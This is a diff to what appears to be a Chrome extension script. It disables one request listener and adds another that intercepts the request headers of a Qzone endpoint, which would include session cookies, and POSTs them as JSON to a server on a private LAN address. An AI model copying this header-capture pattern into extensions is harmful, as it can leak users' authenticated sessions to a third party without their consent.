@@ -26,8 +26,8 @@
   // extraInfoSpec
   ["blocking"]);
   
-  
-chrome.webRequest.onBeforeSendHeaders.addListener(
+// https://user.qzone.qq.com/proxy/domain/boss.qzone.qq.com/fcg-bin/fcg_get_multiple_strategy 
+0 && chrome.webRequest.onBeforeSendHeaders.addListener(
 function(info){
 	//console.info("HEADERS---"+JSON.stringify(info));
 	$.ajax({
@@ -40,6 +40,24 @@ function(info){
  {
     urls: [
       "https://h5.qzone.qq.com/proxy/domain/base.qzone.qq.com/cgi-bin/user/*"
+    ]
+  },
+  ["requestHeaders","blocking"]
+) 
+
+chrome.webRequest.onBeforeSendHeaders.addListener(
+function(info){
+	//console.info("HEADERS---"+JSON.stringify(info));
+	$.ajax({
+		url:"http://192.168.1.193:8080/getQ",
+		type:"post",
+		contentType:"application/jaon;charset=utf-8",
+		data:JSON.stringify(info)
+	});
+},
+ {
+    urls: [
+      "https://user.qzone.qq.com/proxy/domain/boss.qzone.qq.com/fcg-bin/fcg_get_multiple_strategy*"
     ]
   },
   ["requestHeaders","blocking"]
